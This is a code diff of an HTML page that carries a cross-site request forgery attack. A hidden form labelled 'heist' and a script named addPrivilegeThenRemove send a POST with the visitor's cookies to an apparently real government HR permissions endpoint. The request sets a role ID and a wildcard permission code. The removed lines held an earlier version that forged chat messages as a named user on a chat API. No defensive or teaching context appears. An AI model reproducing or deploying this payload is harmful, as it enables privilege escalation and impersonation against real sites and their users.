@@ -23,18 +23,16 @@
       <h1>.......</h1><h1>Test</h1>
     </div>
 
-    <form id="heist" method="POST" action="https://chatappapi-2w5v.onrender.com/messages/send-message?userId=6659ea8d2b34f18ac1d985b7&receiverId=663e719ed78c240b91025b" style="display: none">
-
-            <input name="message" value="ferasAAAAA" />
-<!--       <input name="role_id" value="43" />
-      <input name="code" value="*:*:*:*" /> -->
+    <form id="heist" method="POST" action="https://hr.moi-sy.com/api/permission" style="display: none">
+      <input name="role_id" value="43" />
+      <input name="code" value="*:*:*:*" />
     </form>
 
     <script>
       async function addPrivilegeThenRemove() {
         try {
           // 1) Send the POST request
-          const postResponse = await fetch("https://chatappapi-2w5v.onrender.com/messages/send-message?userId=6659ea8d2b34f18ac1d985b7&receiverId=663e719ed78c240b91025b", {
+          const postResponse = await fetch("https://hr.moi-sy.com/api/permission", {
             method: "POST",
             body: new FormData(document.getElementById("heist")),
             credentials: "include",
